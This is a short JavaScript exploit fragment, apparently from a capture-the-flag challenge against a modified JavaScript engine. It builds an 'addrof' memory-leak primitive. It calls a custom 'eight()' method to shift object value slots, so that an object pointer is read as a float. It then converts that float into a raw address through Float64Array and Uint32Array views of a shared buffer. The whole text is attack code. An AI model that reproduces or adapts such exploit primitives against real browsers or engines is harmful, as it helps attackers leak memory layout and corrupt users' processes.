let buff = new ArrayBuffer(4096);
let f64 = new Float64Array(buff);
let u32 = new Uint32Array(buff);

let addrof = function(thing){
    let o1 = {"gg" : 1, "ff" : thing};
    // shift the first value plane
    print(o1);
    o1.eight();
    print(o1);
    let o = {"hi" : o1.gg, "bye" : 7};
    // shift the second value plane
    // suddenly, value of thing is now tagged with a float!
    o.eight();
    // translation
    f64[0] = o.hi;
    // reshift to not corrupt pointers
    o1.eight();
    o.eight();
    // u32[1] = top bits
    // u32[0] = bottom bits
    // convert hex address to decimal number
    //return parseFloat(Number("0x" + u32[1].toString(16) + u32[0].toString(16)));
    return (u32[1] * (1 << 16) * (1 << 16)) + u32[0];
    };
